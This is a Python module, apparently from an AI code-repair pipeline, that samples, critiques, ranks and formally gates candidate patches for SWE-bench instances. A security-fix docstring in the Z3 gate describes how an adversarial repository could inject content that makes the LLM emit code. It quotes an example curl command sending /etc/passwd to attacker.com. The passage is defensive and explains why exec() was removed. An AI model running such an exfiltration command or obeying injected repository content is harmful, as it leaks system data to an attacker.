"""
swe_bench/bobn_sampler.py
==========================
Behavior Best-of-N (BoBN) trajectory sampler for GAP 5.

Architecture (Section 3.4 / Gap 5.4 of GAP5_SWEBench90_Architecture.md)
──────────────────────────────────────────────────────────────────────────
BoBN is the single highest-leverage algorithmic improvement available
without fine-tuning. The Agent S3 paper (arxiv 2410.02052) demonstrated
that BoBN N=5 lifts a 32B model from ~45% to ~72% on SWE-bench.

The key insight: if a single attempt solves an instance with probability
p=0.4, then N=5 independent attempts succeed with probability:
  P(at least one succeeds) = 1 - (1-0.4)^5 = 92.2%

In practice candidates are correlated (same model, similar logic), so
empirical lift is ~12-18 percentage points. Using TWO DIFFERENT MODEL
FAMILIES (Qwen + DeepSeek) substantially reduces correlation and moves
toward the theoretical ceiling.

BoBN Pipeline
─────────────
1. GENERATE: Fixer A generates BOBN_FIXER_A_COUNT candidates at varying
   temperatures (0.2, 0.4, 0.6). Fixer B generates BOBN_FIXER_B_COUNT
   candidates (0.3, 0.7). All concurrent.

2. EXECUTE: Each candidate runs through ExecutionFeedbackLoop (MAX_ROUNDS
   test→observe→revise iterations). Scores = FAIL_TO_PASS pass rate.

3. ATTACK: AdversarialCriticAgent attacks all candidates concurrently,
   returns CriticAttackReport per candidate.

4. RANK: Composite score = test_score × 0.6 + robustness × 0.3 + minimality × 0.1.
   Candidates sorted descending by composite_score.

4.5 SYNTHESIZE: PatchSynthesisAgent reviews the ranked candidates and their
   attack reports.  It either selects the best single candidate (PICK_BEST)
   or produces a merged patch combining elements from multiple candidates
   (MERGE).  This step replaces the prior pure argmax selection.
   Model family: CLOUD_OSS (Devstral/Llama-4) — different from both fixers
   and the adversarial critic.  Falls back to argmax if the LLM call fails.

5. FORMAL GATE: Winner patch is run through a FOUR-layer self-contained
   formal verification gate:
     Layer 1 — Structural diff sanity (hunk headers, no conflict markers)
     Layer 2 — Safety pattern scan (+lines only: unbounded loops, shell=True, etc.)
     Layer 3 — CBMC bounded model checking for C/C++ patches (hard gate;
               non-blocking when cbmc is absent or times out)
     Layer 4 — Z3 SMT constraint check (advisory; only unsat fails the gate)
   This gate runs inside BoBNSampler.sample() and does NOT require
   SWEBenchEvaluator or SWEInstance.  If the winner fails, the next-best
   candidate is promoted (up to RHODAWK_FORMAL_MAX_RETRIES times).
   Disable with RHODAWK_DISABLE_FORMAL=1.

5.5 TEST GENERATION + MUTATION GATE: When storage and repo_root are provided
   to the constructor, TestGeneratorAgent generates a test suite for the
   winning patch and MutationVerifierAgent verifies that the suite kills at
   least domain_threshold% of mutants.  Domain thresholds:
     MILITARY / AEROSPACE / NUCLEAR: 90%  (DO-178C DAL-A)
     EMBEDDED / AUTOMOTIVE:          80%
     GENERAL:                        configurable (default 60%)
   Mutation gate failure marks winner.formal_gate_passed=False so trajectory
   collection records the run as unresolved.  Infrastructure failures
   (mutmut not installed, etc.) are non-blocking.

6. COLLECT: All (prompt, patch, test_result, reward) triples written to
   TrajectoryCollector for ARPO fine-tuning.  TrajectoryCollector is passed
   in at construction time (optional).  When provided, collect_from_bobn_result
   is called after synthesis so every candidate — winner and losers — becomes
   a training triple.  GRPO benefits from the contrast between good and bad
   attempts from the same distribution.  The controller and evaluator paths
   both pass their own collector instances so no double-counting occurs.

FIX — Formal Gate Closure (Step 5)
────────────────────────────────────
Previously, Step 5 was listed in the module docstring but never executed
inside sample().  The formal gate only ran inside SWEBenchEvaluator._run_formal_gate(),
which is not called when BoBNSampler is used directly from the production
controller path (orchestrator/controller.py::_phase_fix_gap5).

The fix adds BoBNSampler._run_formal_gate_on_patch() — a self-contained
four-layer verifier — and BoBNSampler._apply_formal_gate() which orchestrates
promotion of runner-up candidates on failure.  sample() calls _apply_formal_gate()
between step 4.5 (synthesis) and step 5.5 (test/mutation gate).  The evaluator
path still calls its own _run_formal_gate() for backward compatibility, but
doing so is now additive rather than the only place formal verification runs.

FIX — CBMC inline in Formal Gate (Layer 3)
────────────────────────────────────────────
Previously the formal gate in bobn_sampler only ran 3 layers (diff sanity,
safety patterns, Z3).  CBMC only ran in FormalVerifierAgent which is a
post-commit standalone agent — meaning the production BoBN path never ran
CBMC during candidate selection.  _run_cbmc_on_patch() is now Layer 3 of
the inline formal gate, closing this gap for both the evaluator and
controller call paths.

FIX — TestGenerator + MutationVerifier inline (Step 5.5)
──────────────────────────────────────────────────────────
Previously TestGeneratorAgent and MutationVerifierAgent were only called
from controller._phase_fix_gap5() AFTER BoBNSampler.sample() returned —
meaning the SWE-bench evaluator path had no mutation coverage gate at all.
Step 5.5 runs these inline when storage and repo_root are provided,
closing the gap for all call paths.
"""
from __future__ import annotations

import asyncio
import logging
import os
import re
import time
from dataclasses import dataclass, field
from typing import Any

# Disable formal gate via env (useful for rapid iteration / unit tests)
_DISABLE_FORMAL     = os.environ.get("RHODAWK_DISABLE_FORMAL", "0") == "1"
# Max number of runner-up candidates to try if the synthesis winner fails
_MAX_FORMAL_RETRIES = int(os.environ.get("RHODAWK_FORMAL_MAX_RETRIES", "2"))
# CBMC timeout for Layer 3 of the formal gate (seconds).
# Kept shorter than FormalVerifierAgent's 120s because this runs per candidate.
_CBMC_TIMEOUT_S     = int(os.environ.get("RHODAWK_BOBN_CBMC_TIMEOUT", "60"))

# Hazardous patterns scanned in lines ADDED by a patch.
# Each entry: (regex_pattern, human_readable_description)
_SAFETY_PATTERNS: list[tuple[str, str]] = [
    (r"\bwhile\s*\(\s*true\s*\)|\bfor\s*\(\s*;;\s*\)",           "unbounded loop (CWE-835)"),
    (r"\bmalloc\s*\(|\bcalloc\s*\(|\brealloc\s*\(",               "dynamic alloc post-init"),
    (r"\bnew\s+(?!std::nothrow)",                                  "bare new (prefer nothrow)"),
    (r"\bgoto\b",                                                  "goto (MISRA-C 15.1)"),
    (r"\batoi\s*\(|\batol\s*\(|\batof\s*\(|\batoll\s*\(",         "unsafe atoi family (CWE-190)"),
    (r"\bprintf\s*\(|\bscanf\s*\(|\bfprintf\s*\(|\bfgets\s*\(",  "stdio in safety-critical path"),
    (r"shell\s*=\s*True",                                          "shell=True injection risk"),
    (r"\beval\s*\(",                                               "eval() execution risk"),
]

from agents.adversarial_critic import (
    AdversarialCriticAgent,
    CriticAttackReport,
    PatchMinimalityScore,
    compute_composite_score,
)
from agents.patch_synthesis_agent import (
    PatchSynthesisAgent,
    SynthesisDecision,
    apply_synthesis_decision,
)
from swe_bench.execution_loop import ExecutionFeedbackLoop, ExecutionLoopResult
from swe_bench.trajectory_collector import TrajectoryCollector

log = logging.getLogger(__name__)


@dataclass
class BoBNCandidate:
    """One generated patch candidate in the BoBN pool."""
    candidate_id:    str    = ""
    patch:           str    = ""
    model:           str    = ""
    temperature:     float  = 0.2
    fixer:           str    = "a"   # "a" = Qwen-32B, "b" = DeepSeek-16B

    # Filled after execution loop
    test_score:      float  = 0.0
    all_passed:      bool   = False
    exec_rounds:     int    = 0
    exec_result:     ExecutionLoopResult | None = None

    # Filled after critic attack
    attack_report:   CriticAttackReport | None  = None
    minimality:      PatchMinimalityScore | None = None
    composite_score: float  = 0.0

    # ARCH-03 FIX: issue_ids populated by controller so _gap5_commit() can close
    # the correct issue(s) without relying on getattr fallback.
    issue_ids: list[str] = field(default_factory=list)

    # Filled after synthesis step (GAP 5 fix)
    synthesis_decision: SynthesisDecision | None = None

    # Filled after formal gate (GAP 5 fix — step 5).  None = not yet evaluated.
    formal_gate_passed: bool | None = None

    def to_dict(self) -> dict:
        return {
            "id":          self.candidate_id,
            "patch":       self.patch,
            "model":       self.model,
            "temperature": self.temperature,
            "test_score":  self.test_score,
        }


@dataclass
class BoBNResult:
    """Final output of the BoBN sampling process for one SWE-bench instance."""
    instance_id:      str              = ""
    winner:           BoBNCandidate | None = None
    all_candidates:   list[BoBNCandidate] = field(default_factory=list)
    total_elapsed_s:  float            = 0.0
    n_candidates:     int              = 0
    n_fully_passing:  int              = 0    # candidates where all tests pass
    strategy:         str              = ""   # "bobn" / "fallback"
    # Populated after synthesis step (GAP 5 fix)
    synthesis_action: str              = ""   # "pick_best" | "merge" | "argmax_fallback"
    # Populated after formal gate (GAP 5 fix — step 5)
    formal_gate_passed:  bool          = False
    formal_gate_skipped: bool          = False  # True when RHODAWK_DISABLE_FORMAL=1
    # Populated after test-generation + mutation gate (GAP 5 fix — step 5.5)
    # False means the winner's test suite didn't kill enough mutants.
    # None means the gate was skipped (storage/repo_root not provided to constructor).
    test_gate_passed:      bool | None = None
    mutation_gate_passed:  bool | None = None

    @property
    def winning_patch(self) -> str:
        return self.winner.patch if self.winner else ""

    @property
    def winning_score(self) -> float:
        return self.winner.composite_score if self.winner else 0.0


class BoBNSampler:
    """
    Behavior Best-of-N sampler — orchestrates the full GAP 5 pipeline:
    dual-fixer generation → execution loops → adversarial critique →
    patch synthesis → ranking → formal gate (4 layers) →
    test generation + mutation gate → trajectory collection.

    GAP 5 FIX (Step 4.5 — Synthesis):
    PatchSynthesisAgent is called between the adversarial critique (step 3) and
    the final winner selection (step 4).  This replaces the pure composite_score
    argmax with an LLM-reasoned decision that can MERGE the best elements of
    multiple candidates.

    GAP 5 FIX (Step 5 — Formal Gate Closure):
    The formal gate now runs inside BoBNSampler.sample() after synthesis and
    before trajectory collection.  Four layers: diff sanity → safety patterns
    → CBMC (C/C++) → Z3 SMT.  Self-contained — no SWEBenchEvaluator dependency.

    GAP 5 FIX (Step 5 — CBMC Layer 3):
    CBMC is now Layer 3 of the inline formal gate.  Previously CBMC only ran
    in FormalVerifierAgent (post-commit standalone agent), so BoBN candidate
    selection never exercised bounded model checking.  _run_cbmc_on_patch()
    extracts added C/C++ content from the diff and runs cbmc with standard
    safety flags.  Non-blocking when cbmc is absent or times out.

    GAP 5 FIX (Step 5.5 — TestGenerator + MutationVerifier):
    When storage and repo_root are provided, TestGeneratorAgent generates a
    test suite for the winning patch and MutationVerifierAgent verifies that
    the suite kills >= domain_threshold% of mutants before trajectory collection.
    This closes the gap where the evaluator path had no mutation coverage gate.

    Parameters
    ──────────
    model_router         — TieredModelRouter
    critic               — AdversarialCriticAgent (must be different model family)
    synthesis            — PatchSynthesisAgent (optional; auto-created if None)
    localization         — LocalizationResult from SWEBenchLocalizer
    trajectory_collector — TrajectoryCollector (optional).  When provided, every
                           candidate in a completed BoBN run is recorded as an
                           ARPO training triple at the end of sample().  Pass None
                           to skip trajectory collection (e.g. during unit tests).
    enable_formal_gate   — When True (default), the formal gate runs after synthesis.
                           Overridden to False when RHODAWK_DISABLE_FORMAL=1.
    storage              — BrainStorage instance (optional).  Required for inline
                           TestGenerator + MutationVerifier (step 5.5).  When None
                           the test/mutation gate is skipped.
    run_id               — Run identifier string for TestGenerator/MutationVerifier
                           storage records.  Defaults to the sample() instance_id
                           when not provided.
    repo_root            — Path to the repository root (optional).  Required for
                           CBMC (detects file paths in diff) and TestGenerator /
                           MutationVerifier.  When None, CBMC writes to a temp
                           dir and test/mutation gate is skipped.
    domain_mode          — DomainMode enum value controlling mutation score
                           thresholds (MILITARY=90%, GENERAL=60%, etc.).
    mutation_threshold   — Override the domain_mode-derived mutation threshold
                           (0–100).  None = use domain_mode default.
    """

    def __init__(
        self,
        model_router:           Any,
        critic:                 AdversarialCriticAgent,
        issue_text:             str                       = "",
        localization_context:   str                       = "",
        synthesis:              PatchSynthesisAgent | None = None,
        trajectory_collector:   TrajectoryCollector | None = None,
        enable_formal_gate:     bool                      = True,
        storage:                Any | None                = None,
        run_id:                 str                       = "",
        repo_root:              Any | None                = None,
        domain_mode:            Any | None                = None,
        mutation_threshold:     float | None              = None,
        # ARCH-02 FIX: accept cpg_engine so evaluator.py can pass the
        # per-instance CPGEngine without it being silently ignored.
        cpg_engine:             Any | None                = None,
    ) -> None:
        self.router       = model_router
        self.critic       = critic
        self.issue        = issue_text
        self.loc_ctx      = localization_context
        self._collector   = trajectory_collector
        # Formal gate: respect constructor flag AND env override
        self._formal_enabled = enable_formal_gate and not _DISABLE_FORMAL
        # Synthesis agent: use provided instance or auto-create from same router.
        # Auto-create uses CLOUD_OSS tier — different family from all vLLM models.
        self._synthesis = synthesis or PatchSynthesisAgent(model_router=model_router)
        # Step 5.5 — TestGen + Mutation: require storage + repo_root to activate
        self._storage            = storage
        self._run_id             = run_id
        self._repo_root          = repo_root
        self._domain_mode        = domain_mode
        self._mutation_threshold = mutation_threshold
        # ARCH-02 FIX: store cpg_engine so localization can use causal context.
        self._cpg_engine         = cpg_engine

    async def sample(
        self,
        instance_id:  str,
        repo:         str,
        base_commit:  str,
        fail_tests:   list[str],
        pass_tests:   list[str] | None = None,
        repo_root:    Any              = None,
    ) -> BoBNResult:
        """
        Run the complete BoBN sampling pipeline for one SWE-bench instance.

        Generates N candidates from two model families, runs each through
        test-execution feedback loop, attacks with adversarial critic,
        synthesizes the winner (merge or pick_best), and returns the result.
        """
        start = time.monotonic()
        result = BoBNResult(
            instance_id = instance_id,
            strategy    = "bobn",
        )

        from models.router import BOBN_FIXER_A_COUNT, BOBN_FIXER_B_COUNT

        # ── Step 1: Generate candidates concurrently ──────────────────────────
        log.info(
            f"[bobn] {instance_id}: generating "
            f"{BOBN_FIXER_A_COUNT}A + {BOBN_FIXER_B_COUNT}B candidates"
        )
        candidates = await self._generate_all_candidates(
            BOBN_FIXER_A_COUNT, BOBN_FIXER_B_COUNT
        )
        result.n_candidates = len(candidates)

        if not candidates:
            log.warning(f"[bobn] {instance_id}: no candidates generated — returning empty")
            result.strategy = "fallback"
            return result

        # ── Step 2: Run execution loops concurrently ──────────────────────────
        log.info(f"[bobn] {instance_id}: running {len(candidates)} execution loops")
        exec_loop = ExecutionFeedbackLoop(
            instance_id = instance_id,
            repo        = repo,
            base_commit = base_commit,
            fail_tests  = fail_tests,
            pass_tests  = pass_tests,
            repo_root   = repo_root,
        )
        candidates = await self._run_execution_loops(candidates, exec_loop)

        result.n_fully_passing = sum(1 for c in candidates if c.all_passed)
        log.info(
            f"[bobn] {instance_id}: {result.n_fully_passing}/{len(candidates)} "
            "candidates fully pass all FAIL_TO_PASS tests"
        )

        # ── Step 3: Adversarial critique ──────────────────────────────────────
        log.info(f"[bobn] {instance_id}: running adversarial critique")
        attack_reports = await self.critic.attack_all_candidates(
            issue_text = self.issue,
            candidates = [c.to_dict() for c in candidates],
            fail_tests = fail_tests,
            pass_tests = pass_tests,
        )

        # ── Step 4: Compute composite scores and sort ─────────────────────────
        for candidate, report in zip(candidates, attack_reports):
            candidate.attack_report   = report
            candidate.minimality      = AdversarialCriticAgent.compute_minimality_score(
                candidate.patch
            )
            candidate.composite_score = compute_composite_score(
                test_score       = candidate.test_score,
                attack_report    = report,
                minimality_score = candidate.minimality,
            )

        # Sort descending by composite score
        candidates.sort(key=lambda c: c.composite_score, reverse=True)
        result.all_candidates = candidates

        # ── Step 4.5: Patch synthesis — pick_best or merge ────────────────────
        # GAP 5 FIX: This step was previously missing.  Pure argmax selection
        # cannot merge the best elements of candidates A and B when each fixes
        # a different sub-problem.  PatchSynthesisAgent does.
        log.info(f"[bobn] {instance_id}: running patch synthesis (step 4.5)")
        winner = await self._synthesize_winner(
            instance_id    = instance_id,
            candidates     = candidates,
            attack_reports = attack_reports,
            result         = result,
        )

        # ── Step 5: Formal gate ───────────────────────────────────────────────
        # GAP 5 FIX: Previously listed in the docstring but never executed here.
        # The gate only ran inside SWEBenchEvaluator, leaving the production
        # controller path (controller._phase_fix_gap5) without formal verification.
        # _apply_formal_gate() is self-contained — no SWEInstance dependency.
        # On failure it promotes the next-best ranked candidate (up to
        # _MAX_FORMAL_RETRIES attempts) before giving up and returning the
        # synthesis winner with formal_gate_passed=False.
        winner, gate_passed, gate_skipped = await self._apply_formal_gate(
            instance_id = instance_id,
            winner      = winner,
            candidates  = candidates,
        )
        result.formal_gate_passed  = gate_passed
        result.formal_gate_skipped = gate_skipped

        result.winner          = winner
        result.total_elapsed_s = time.monotonic() - start

        if result.winner:
            log.info(
                f"[bobn] {instance_id}: winner=candidate_{result.winner.candidate_id} "
                f"model={result.winner.model} temp={result.winner.temperature} "
                f"test_score={result.winner.test_score:.2f} "
                f"composite={result.winner.composite_score:.2f} "
                f"synthesis={result.synthesis_action} "
                f"formal={'PASS' if gate_passed else ('SKIP' if gate_skipped else 'FAIL')} "
                f"elapsed={result.total_elapsed_s:.1f}s"
            )

        # ── Step 5.5: TestGenerator + MutationVerifier inline gate ───────────
        # GAP 5 FIX: Previously missing from bobn_sampler.sample().
        # TestGenerator and MutationVerifier only ran in controller._phase_fix_gap5()
        # AFTER BoBNSampler returned, meaning the SWE-bench evaluator path had no
        # mutation coverage gate at all.
        #
        # When storage and repo_root are provided, this step runs inline so both
        # the evaluator path and the controller path execute the full audit diagram:
        #   Formal Gate → Test Generator + Mutation → Commit
        #
        # Mutation gate failure marks winner.formal_gate_passed=False so trajectory
        # collection records the run as unresolved (same semantics as a formal fail).
        # Infrastructure failures (mutmut not installed) are non-blocking.
        if result.winner and self._storage and self._repo_root:
            result.winner = await self._run_test_mutation_gate(
                instance_id = instance_id,
                winner      = result.winner,
                result      = result,
            )

        # ── Step 6: Trajectory collection for ARPO fine-tuning ────────────────
        # Record every candidate — winner and losers — as a training triple.
        # GRPO learns from the contrast between attempts; only recording the
        # winner would throw away the most informative negative signal.
        # resolved=True only when the winner passed all FAIL_TO_PASS tests
        # (all_passed flag).  Production paths where fail_tests=[] will have
        # all_passed=False, which correctly labels those runs as unresolved
        # rather than poisoning the training corpus with false positives.
        if self._collector is not None and result.all_candidates:
            _resolved = bool(result.winner and result.winner.all_passed)
            try:
                self._collector.collect_from_bobn_result(
                    instance_id = instance_id,
                    bobn_result = result,
                    resolved    = _resolved,
                    issue_text  = self.issue,
                    loc_context = self.loc_ctx,
                )
                _corpus = self._collector.corpus_size()
                log.debug(
                    f"[bobn] {instance_id}: trajectories recorded "
                    f"(corpus={_corpus}, resolved={_resolved})"
                )
                if self._collector.is_ready_for_training():
                    log.info(
                        f"[bobn] RL corpus ready ({_corpus} trajectories) — "
                        "run: python scripts/arpo_trainer.py"
                    )
            except Exception as _tc_exc:
                log.warning(f"[bobn] trajectory collection non-fatal: {_tc_exc}")

        return result

    # ── Formal gate (Step 5) ─────────────────────────────────────────────────

    async def _apply_formal_gate(
        self,
        instance_id: str,
        winner:      BoBNCandidate | None,
        candidates:  list[BoBNCandidate],
    ) -> tuple[BoBNCandidate | None, bool, bool]:
        """
        Run the formal gate on the synthesis winner.  Promote runner-ups on failure.

        Returns (winner, gate_passed, gate_skipped).
          winner       — the verified winner (may differ from input if promoted)
          gate_passed  — True if the final winner cleared the gate
          gate_skipped — True if the gate was disabled via env/flag
        """
        if not self._formal_enabled:
            log.debug(f"[bobn] {instance_id}: formal gate disabled (RHODAWK_DISABLE_FORMAL=1)")
            if winner:
                winner.formal_gate_passed = None  # not evaluated
            return winner, False, True

        if winner is None:
            return winner, False, False

        # Build the ordered list of candidates to try.
        # The synthesis winner is evaluated first; if it fails we walk down
        # the composite-ranked list (which excludes the MERGE synthetic candidate).
        candidates_to_try: list[BoBNCandidate] = []
        winner_in_ranked = any(c.candidate_id == winner.candidate_id for c in candidates)

        if not winner_in_ranked:
            # MERGE candidate — try it first, then fall back to top ranked
            candidates_to_try.append(winner)
            candidates_to_try.extend(candidates[:_MAX_FORMAL_RETRIES])
        else:
            # PICK_BEST — winner is in the ranked list
            candidates_to_try.append(winner)
            for c in candidates:
                if c.candidate_id != winner.candidate_id:
                    candidates_to_try.append(c)
                    if len(candidates_to_try) > _MAX_FORMAL_RETRIES + 1:
                        break

        for i, candidate in enumerate(candidates_to_try):
            gate_ok = await self._run_formal_gate_on_patch(
                patch       = candidate.patch,
                instance_id = instance_id,
                attempt     = i,
            )
            candidate.formal_gate_passed = gate_ok

            if gate_ok:
                if i > 0:
                    log.info(
                        f"[bobn] {instance_id}: formal gate promoted runner-up "
                        f"candidate={candidate.candidate_id} after {i} failure(s)"
                    )
                return candidate, True, False

            log.warning(
                f"[bobn] {instance_id}: formal gate FAILED for "
                f"candidate={candidate.candidate_id} "
                f"(attempt {i + 1}/{len(candidates_to_try)})"
            )

        # All retries exhausted — return the synthesis winner with gate_passed=False.
        # A failing patch is still surfaced for human review rather than silently dropped.
        log.warning(
            f"[bobn] {instance_id}: formal gate failed for all "
            f"{len(candidates_to_try)} candidate(s) — "
            "returning synthesis winner with formal_gate_passed=False"
        )
        winner.formal_gate_passed = False
        return winner, False, False

    async def _run_formal_gate_on_patch(
        self,
        patch:       str,
        instance_id: str,
        attempt:     int = 0,
    ) -> bool:
        """
        Four-layer self-contained formal gate.

        Does NOT depend on SWEInstance, BrainStorage, or SWEBenchEvaluator.
        Runs identically on every BoBNSampler call path (evaluator and controller).

        Layer 1 — Structural diff sanity (always runs, zero deps):
          Validates the patch has at least one hunk header, no conflict markers,
          and at least one non-whitespace added line.

        Layer 2 — Safety pattern scan (always runs, zero deps):
          Scans ONLY the +lines of the diff for hazard patterns (unbounded loops,
          dynamic allocation, goto, unsafe atoi family, stdio in safety-critical
          paths, shell=True, eval).  A match fails the gate immediately.

        Layer 3 — CBMC bounded model checking (C/C++ patches only):
          GAP 5 FIX: Previously missing from this method.  CBMC only ran in
          FormalVerifierAgent (post-commit standalone agent), so BoBN candidate
          selection never exercised bounded model checking.
          Detects C/C++ files from diff headers.  Extracts added content, wraps
          in a minimal harness, and runs cbmc with --bounds-check --pointer-check
          --div-by-zero-check --signed-overflow-check.  Non-blocking when cbmc
          is absent or times out — only a confirmed counterexample (rc=10) fails.

        Layer 4 — Z3 SMT constraint check (runs if z3-solver is installed):
          Asks the routing LLM to extract Z3 Python assertions for the key fix
          invariants and verifies them.  Non-blocking — infrastructure failures
          (z3 not installed, LLM timeout, unparseable code) are skipped, not
          failed.  Only a concrete z3.unsat result fails the gate.

        Returns True (pass) or False (concrete violation detected).
        """
        prefix = f"[formal_gate] {instance_id} attempt={attempt}"

        if not patch or not patch.strip():
            log.debug(f"{prefix}: empty patch — trivially passing")
            return True

        # ── Layer 1: Structural diff sanity ───────────────────────────────────
        from agents.patch_synthesis_agent import _validate_diff
        if not _validate_diff(patch):
            log.warning(
                f"{prefix}: Layer 1 FAIL — malformed diff "
                "(no hunk headers or conflict markers present)"
            )
            return False

        added_lines = [
            line[1:] for line in patch.split("\n")
            if line.startswith("+") and not line.startswith("+++")
        ]
        if not any(line.strip() for line in added_lines):
            log.warning(f"{prefix}: Layer 1 FAIL — patch adds no non-whitespace lines")
            return False

        # ── Layer 2: Safety pattern scan ──────────────────────────────────────
        added_content = "\n".join(added_lines)
        violations: list[str] = []
        for pattern, description in _SAFETY_PATTERNS:
            if re.search(pattern, added_content):
                violations.append(description)

        if violations:
            log.warning(
                f"{prefix}: Layer 2 FAIL — "
                f"safety pattern violation(s): {'; '.join(violations)}"
            )
            return False

        log.debug(
            f"{prefix}: Layer 1+2 passed "
            f"({len(added_lines)} added lines, no violations)"
        )

        # ── Layer 3: CBMC bounded model checking (C/C++ patches only) ─────────
        # GAP 5 FIX: This layer was previously missing — CBMC only ran in
        # FormalVerifierAgent post-commit, never during BoBN candidate selection.
        try:
            cbmc_ok = await self._run_cbmc_on_patch(
                patch       = patch,
                instance_id = instance_id,
            )
            if not cbmc_ok:
                log.warning(f"{prefix}: Layer 3 FAIL — CBMC counterexample found")
                return False
            log.debug(f"{prefix}: Layer 3 passed (CBMC)")
        except Exception as exc:
            # Infrastructure failures (cbmc not installed, timeout) are non-blocking.
            # Only a confirmed rc=10 counterexample fails — everything else skips.
            log.debug(f"{prefix}: Layer 3 skipped ({exc})")

        # ── Layer 4: Z3 SMT constraint check ──────────────────────────────────
        try:
            z3_ok = await self._run_z3_gate(patch=patch, instance_id=instance_id)
            if not z3_ok:
                log.warning(f"{prefix}: Layer 4 FAIL — Z3 found a counterexample")
                return False
            log.debug(f"{prefix}: Layer 4 passed (Z3)")
        except Exception as exc:
            # Infrastructure failures are non-blocking
            log.debug(f"{prefix}: Layer 4 skipped ({exc})")

        log.info(f"{prefix}: all layers passed")
        return True

    async def _run_cbmc_on_patch(self, patch: str, instance_id: str) -> bool:
        """
        Extract added C/C++ content from the diff and run CBMC on it.

        GAP 5 FIX: Closes the gap where CBMC only ran in FormalVerifierAgent
        (post-commit) and never during BoBN candidate selection.

        Detection:
          Inspects '--- a/...' headers in the diff to determine whether any
          touched file has a C/C++ extension.  Skips silently for non-C patches.

        Harness:
          The added lines (+lines) are extracted from the diff, wrapped in a
          minimal harness function, and written to a temporary .c file.  This
          is intentionally lightweight — the goal is to catch obvious memory
          safety violations (buffer overruns, null derefs, integer overflows)
          introduced by the patch, not full compilation of the whole codebase.

        Returns:
          True  — no counterexample found, or gate was skipped (cbmc absent,
                  timeout, non-C patch).
          False — CBMC returned rc=10 (confirmed counterexample).
        """
        import shutil

        # ── Detect C/C++ files in diff ────────────────────────────────────────
        _c_extensions = {".c", ".cpp", ".cc", ".cxx", ".h", ".hpp", ".hxx"}
        touched_files = [
            ln.split()[-1]
            for ln in patch.splitlines()
            if ln.startswith("--- ") and not ln.startswith("--- /dev/null")
        ]
        has_c_files = any(
            any(f.endswith(ext) for ext in _c_extensions)
            for f in touched_files
        )
        if not has_c_files:
            log.debug(f"[cbmc_gate] {instance_id}: no C/C++ files in patch — layer skipped")
            return True

        if not shutil.which("cbmc"):
            log.debug(f"[cbmc_gate] {instance_id}: cbmc not in PATH — layer skipped")
            return True

        # ── Extract added lines as C content ──────────────────────────────────
        added_lines = [
            line[1:] for line in patch.split("\n")
            if line.startswith("+") and not line.startswith("+++")
        ]
        c_content = "\n".join(added_lines).strip()
        if not c_content:
            return True

        # ── Wrap in minimal CBMC harness ──────────────────────────────────────
        harness = (
            "#include <stdint.h>\n"
            "#include <stdbool.h>\n"
            "#include <stdlib.h>\n\n"
            "/* CBMC harness generated by BoBNSampler formal gate */\n"
            "void __patch_harness(void) {\n"
            f"{c_content}\n"
            "}\n\n"
            "int main(void) { __patch_harness(); return 0; }\n"
        )

        import subprocess
        import tempfile
        from pathlib import Path

        tmp_path: str = ""
        try:
            with tempfile.NamedTemporaryFile(
                suffix=".c", mode="w", encoding="utf-8", delete=False
            ) as f:
                f.write(harness)
                tmp_path = f.name

            result = subprocess.run(
                [
                    "cbmc", tmp_path,
                    "--json-ui",
                    "--bounds-check",
                    "--pointer-check",
                    "--div-by-zero-check",
                    "--signed-overflow-check",
                    "--unwind", "5",
                ],
                capture_output=True,
                text=True,
                timeout=_CBMC_TIMEOUT_S,
            )

            # rc=0  → VERIFICATION SUCCESSFUL (no violations)
            # rc=10 → VERIFICATION FAILED (concrete counterexample)
            # other → parse error / unsupported input → skip
            if result.returncode == 10:
                log.warning(
                    f"[cbmc_gate] {instance_id}: CBMC counterexample found "
                    f"(rc=10) — patch has a concrete safety violation"
                )
                return False

            log.debug(
                f"[cbmc_gate] {instance_id}: CBMC rc={result.returncode} — "
                "no counterexample (gate passes)"
            )
            return True

        except subprocess.TimeoutExpired:
            log.debug(
                f"[cbmc_gate] {instance_id}: CBMC timeout after {_CBMC_TIMEOUT_S}s "
                "— layer skipped (non-blocking)"
            )
            return True
        except Exception as exc:
            log.debug(
                f"[cbmc_gate] {instance_id}: CBMC infrastructure error: {exc} "
                "— layer skipped (non-blocking)"
            )
            return True
        finally:
            if tmp_path:
                Path(tmp_path).unlink(missing_ok=True)

    async def _run_z3_gate(self, patch: str, instance_id: str) -> bool:
        """
        Ask the routing LLM to extract Z3 assertions for the patch's key
        invariants, then verify them with the z3-solver Python package.

        SEC-01 FIX: The previous implementation called exec(z3_code, namespace)
        on raw LLM output derived from repository source code. An adversarial
        repository could embed content causing the LLM to emit arbitrary Python
        (e.g. subprocess.run(['curl','attacker.com','-d',open('/etc/passwd').read()])).
        exec() with no __builtins__ restriction and the full z3 namespace available
        gave near-unrestricted code execution.

        This implementation asks the LLM for structured JSON describing Z3
        constraints and constructs the solver programmatically using the safe
        z3.parse_smt2_string() API. LLM output is never executed.

        Returns True  — assertions are satisfiable or gate was skipped.
        Returns False — Z3 produced a concrete unsat result (counterexample).
        Raises RuntimeError for infrastructure failures (caller skips layer).
        """
        import importlib.util
        if importlib.util.find_spec("z3") is None:
            raise RuntimeError("z3-solver not installed — Layer 3 skipped")

        # Ask the LLM to return a safe JSON DSL, not executable Python.
        prompt = (
            "You are a formal verification assistant.\n"
            "Given the patch below, extract at most 3 key safety invariants.\n"
            "Return ONLY a JSON object with this exact schema:\n"
            '{"variables": {"name": "Int|Bool"}, '
            '"assertions": ["SMT-LIB2 assert expression as string"]}\n'
            "Use only Int and Bool sorts. Use standard SMT-LIB2 syntax "
            "(e.g. \"(>= x 0)\", \"(=> p q)\").\n"
            "If the patch is too simple for SMT verification, return: "
            '{"variables": {}, "assertions": []}\n\n'
            f"Patch:\n```diff\n{patch[:3000]}\n```"
        )

        try:
            import litellm
            resp = await litellm.acompletion(
                model       = self.router.synthesis_model(),
                messages    = [{"role": "user", "content": prompt}],
                max_tokens  = 512,
                temperature = 0.0,
            )
            raw = resp.choices[0].message.content or ""
        except Exception as exc:
            raise RuntimeError(f"LLM extraction failed: {exc}") from exc

        # Parse the JSON response — never eval/exec it.
        import json, re
        clean = re.sub(r"```(?:json)?\s*", "", raw).strip()
        match = re.search(r"\{.*\}", clean, re.DOTALL)
        if not match:
            log.debug(f"[z3_gate] {instance_id}: LLM returned no JSON — skipping")
            return True

        try:
            data = json.loads(match.group(0))
        except json.JSONDecodeError:
            return True

        assertions: list[str] = data.get("assertions", [])
        variables:  dict      = data.get("variables", {})

        if not assertions:
            log.debug(f"[z3_gate] {instance_id}: no assertions — skipping")
            return True

        # Construct Z3 solver from the safe JSON DSL without exec().
        try:
            import z3
            sort_map = {"Int": z3.IntSort(), "Bool": z3.BoolSort()}
            var_decls = []
